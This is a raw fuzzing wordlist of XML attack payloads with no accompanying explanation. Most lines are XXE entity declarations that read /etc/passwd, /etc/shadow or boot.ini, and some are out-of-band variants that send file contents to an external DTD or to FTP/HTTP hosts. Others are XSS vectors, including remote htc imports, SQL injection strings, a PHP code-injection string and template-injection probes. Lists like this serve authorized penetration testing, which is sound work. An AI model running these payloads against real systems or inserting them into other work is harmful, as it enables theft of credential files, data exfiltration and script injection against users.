%
*
*/*
+
-
/
//
//*
:
;
@
@*
]>
$
0
0.00005
0.1
0.9
-1
1
1.7976931348623157e+308
5e-10
5e-324
&apos;XoiZR
<![CDATA[<]]>SCRIPT<![CDATA[>]]>alert('XSS');<![CDATA[<]]>/SCRIPT<![CDATA[>]]>
<![CDATA[<script>var n=0;while(true){n++;}</script>]]>
<![CDATA[<test></test>]]>
count(/child::node())
<!DOCTYPE autofillupload [<!ENTITY 9eTVC SYSTEM "file:///etc/passwd">
<!DOCTYPE autofillupload [<!ENTITY D71Mn SYSTEM "file:///c:/boot.ini">
<!DOCTYPE foo [<!ELEMENT foo ANY ><!ENTITY xxe SYSTEM "file:///c:/boot.ini" >]>
<!DOCTYPE foo [<!ELEMENT foo ANY><!ENTITY xxe SYSTEM "file:////dev/random">]>
<!DOCTYPE foo [<!ELEMENT foo ANY ><!ENTITY xxe SYSTEM "file:///etc/passwd" >]>
<!DOCTYPE foo [<!ELEMENT foo ANY ><!ENTITY xxe SYSTEM "file:///etc/shadow" >]>
<!DOCTYPE foo [<!ELEMENT foo ANY ><!ENTITY xxe SYSTEM "http://example.com/text.txt" >]>
<!DOCTYPE xxe [ <!ENTITY % file SYSTEM "file:///c:/boot.ini"><!ENTITY % dtd SYSTEM "http://example.com/evil.dtd">%dtd;%trick;]>
<!DOCTYPE xxe [ <!ENTITY % file SYSTEM "file:///etc/issue"><!ENTITY % dtd SYSTEM "http://example.com/evil.dtd">%dtd;%trick;]>
<!DOCTYPE xxe [<!ENTITY foo "aaaaaa">]>
<!DOCTYPE xxe [<!ENTITY foo "aaaaaa">]><root>&foo;</root>
<!ENTITY % int "<!ENTITY &#37; trick SYSTEM 'http://127.0.0.1:80/?%file;'>  "> %int;
<!ENTITY % param3 "<!ENTITY &#x25; exfil SYSTEM 'ftp://127.0.0.1:21/%data3;'>">
<!ENTITY % xxe SYSTEM "php://filter/convert.base64-encode/resource=/etc/passwd" >
false
%foo;
&foo;
<foo><![CDATA[' or 1=1 or ''=']]></foo>
<foo><![CDATA[<]]>SCRIPT<![CDATA[>]]>alert('XSS');<![CDATA[<]]>/SCRIPT<![CDATA[>]]></foo>
<HTML xmlns:xss><?import namespace="xss" implementation="http://ha.ckers.org/xss.htc">
<HTML xmlns:xss><?import namespace="xss" implementation="http://ha.ckers.org/xss.htc"><xss:xss>XSS</xss:xss></HTML>
"<HTML xmlns:xss><?import namespace=""xss"" implementation=""http://xss.rocks/xss.htc""><xss:xss>XSS</xss:xss></HTML>"
&lt;Tnn96&gt;
&lt;% Tnn96 %&gt;
&lt;%= Tnn96 %&gt;
&lt;? Tnn96 ?&gt;
&lt;?Tnn96 ?&gt;
<name>','')); phpinfo(); exit;/*</name>
null
' or ''='
' or '1'='1
&quot;XoiZR
<soap:Body><foo><![CDATA[<!DOCTYPE doc [<!ENTITY % dtd SYSTEM "http://x.x.x.x:22/"> %dtd;]><xxx/>]]></foo></soap:Body>
<SPAN DATASRC=#I DATAFLD=C DATAFORMATAS=HTML></SPAN>
<test></test>
(Tnn96)
[Tnn96]
{= Tnn96}
{{= Tnn96}}
{{Tnn96}}
{Tnn96}
true
"<xml ID=I><X><C><![CDATA[<IMG SRC=""javas]]><![CDATA[cript:alert('XSS');"">]]>"
<xml ID=I><X><C><![CDATA[<IMG SRC="javas]]><![CDATA[cript:alert('XSS');">]]>
"<xml ID=""xss""><I><B><IMG SRC=""javas<!-- -->cript:alert('XSS')""></B></I></xml><SPAN DATASRC=""#xss"" DATAFLD=""B"" DATAFORMATAS=""HTML""></SPAN></C></X></xml><SPAN DATASRC=#I DATAFLD=C DATAFORMATAS=HTML></SPAN>"
<xml ID="xss"><I><B>&lt;IMG SRC="javas<!-- -->cript:alert('XSS')"&gt;</B></I></xml><SPAN DATASRC="#xss" DATAFLD="B" DATAFORMATAS="HTML"></SPAN></C></X></xml><SPAN DATASRC=#I DATAFLD=C DATAFORMATAS=HTML></SPAN>
<xml SRC="xsstest.xml" ID=I></xml>
"<xml SRC=""xsstest.xml"" ID=I></xml><SPAN DATASRC=#I DATAFLD=C DATAFORMATAS=HTML></SPAN>"
<xml SRC="xsstest.xml" ID=I></xml><SPAN DATASRC=#I DATAFLD=C DATAFORMATAS=HTML></SPAN>
<?xml version="1.0"?><!DOCTYPE root [<!ENTITY test0 SYSTEM "file:///etc/passwd">]><root>&test0;</root>
<?xml version="1.0"?><!DOCTYPE root [<!ENTITY test10 SYSTEM "file:///etc/passwd">]><root>&test10;</root>
<?xml version="1.0"?><!DOCTYPE root [<!ENTITY test11 SYSTEM "file:///etc/passwd">]><root>&test11;</root>
<?xml version="1.0"?><!DOCTYPE root [<!ENTITY test12 SYSTEM "file:///etc/passwd">]><root>&test12;</root>
<?xml version="1.0"?><!DOCTYPE root [<!ENTITY test13 SYSTEM "file:///etc/passwd">]><root>&test13;</root>
<?xml version="1.0"?><!DOCTYPE root [<!ENTITY test14 SYSTEM "file:///etc/passwd">]><root>&test14;</root>
<?xml version="1.0"?><!DOCTYPE root [<!ENTITY test15 SYSTEM "file:///etc/passwd">]><root>&test15;</root>
<?xml version="1.0"?><!DOCTYPE root [<!ENTITY test16 SYSTEM "file:///etc/passwd">]><root>&test16;</root>
<?xml version="1.0"?><!DOCTYPE root [<!ENTITY test17 SYSTEM "file:///etc/passwd">]><root>&test17;</root>
<?xml version="1.0"?><!DOCTYPE root [<!ENTITY test18 SYSTEM "file:///etc/passwd">]><root>&test18;</root>
<?xml version="1.0"?><!DOCTYPE root [<!ENTITY test19 SYSTEM "file:///etc/passwd">]><root>&test19;</root>
<?xml version="1.0"?><!DOCTYPE root [<!ENTITY test1 SYSTEM "file:///etc/passwd">]><root>&test1;</root>
<?xml version="1.0"?><!DOCTYPE root [<!ENTITY test20 SYSTEM "file:///etc/passwd">]><root>&test20;</root>
<?xml version="1.0"?><!DOCTYPE root [<!ENTITY test21 SYSTEM "file:///etc/passwd">]><root>&test21;</root>
<?xml version="1.0"?><!DOCTYPE root [<!ENTITY test22 SYSTEM "file:///etc/passwd">]><root>&test22;</root>
<?xml version="1.0"?><!DOCTYPE root [<!ENTITY test23 SYSTEM "file:///etc/passwd">]><root>&test23;</root>
<?xml version="1.0"?><!DOCTYPE root [<!ENTITY test24 SYSTEM "file:///etc/passwd">]><root>&test24;</root>
<?xml version="1.0"?><!DOCTYPE root [<!ENTITY test25 SYSTEM "file:///etc/passwd">]><root>&test25;</root>
<?xml version="1.0"?><!DOCTYPE root [<!ENTITY test26 SYSTEM "file:///etc/passwd">]><root>&test26;</root>
<?xml version="1.0"?><!DOCTYPE root [<!ENTITY test27 SYSTEM "file:///etc/passwd">]><root>&test27;</root>
<?xml version="1.0"?><!DOCTYPE root [<!ENTITY test28 SYSTEM "file:///etc/passwd">]><root>&test28;</root>
<?xml version="1.0"?><!DOCTYPE root [<!ENTITY test29 SYSTEM "file:///etc/passwd">]><root>&test29;</root>
<?xml version="1.0"?><!DOCTYPE root [<!ENTITY test2 SYSTEM "file:///etc/passwd">]><root>&test2;</root>
<?xml version="1.0"?><!DOCTYPE root [<!ENTITY test30 SYSTEM "file:///etc/passwd">]><root>&test30;</root>
<?xml version="1.0"?><!DOCTYPE root [<!ENTITY test31 SYSTEM "file:///etc/passwd">]><root>&test31;</root>
<?xml version="1.0"?><!DOCTYPE root [<!ENTITY test32 SYSTEM "file:///etc/passwd">]><root>&test32;</root>
<?xml version="1.0"?><!DOCTYPE root [<!ENTITY test33 SYSTEM "file:///etc/passwd">]><root>&test33;</root>
<?xml version="1.0"?><!DOCTYPE root [<!ENTITY test34 SYSTEM "file:///etc/passwd">]><root>&test34;</root>
<?xml version="1.0"?><!DOCTYPE root [<!ENTITY test35 SYSTEM "file:///etc/passwd">]><root>&test35;</root>
<?xml version="1.0"?><!DOCTYPE root [<!ENTITY test36 SYSTEM "file:///etc/passwd">]><root>&test36;</root>
<?xml version="1.0"?><!DOCTYPE root [<!ENTITY test37 SYSTEM "file:///etc/passwd">]><root>&test37;</root>
<?xml version="1.0"?><!DOCTYPE root [<!ENTITY test38 SYSTEM "file:///etc/passwd">]><root>&test38;</root>
<?xml version="1.0"?><!DOCTYPE root [<!ENTITY test39 SYSTEM "file:///etc/passwd">]><root>&test39;</root>
<?xml version="1.0"?><!DOCTYPE root [<!ENTITY test3 SYSTEM "file:///etc/passwd">]><root>&test3;</root>
<?xml version="1.0"?><!DOCTYPE root [<!ENTITY test40 SYSTEM "file:///etc/passwd">]><root>&test40;</root>
